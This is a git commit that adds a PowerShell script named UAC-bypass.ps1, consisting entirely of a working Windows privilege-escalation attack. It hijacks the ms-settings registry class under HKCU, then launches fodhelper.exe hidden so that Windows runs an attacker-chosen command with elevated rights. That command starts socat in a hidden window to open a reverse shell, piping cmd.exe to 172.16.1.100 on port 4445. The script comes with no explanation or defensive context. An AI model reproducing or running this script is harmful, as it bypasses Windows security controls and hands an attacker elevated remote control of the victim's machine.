d0d2042fc241936a1d47495e4177ea7d066d3e40
Musheebat <98224710+musheebat@users.noreply.github.com>
2023-03-01 21:36:03 +1030

    Add files via upload

---
+++ UAC-bypass.ps1
@@ -0,0 +1,9 @@
+$program = "powershell -windowstyle hidden C:\users\public\downloads\socat.exe TCP:172.16.1.100:4445 EXEC:cmd.exe,pipes"
+
+New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
+Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
+    
+New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
+Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
+    
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
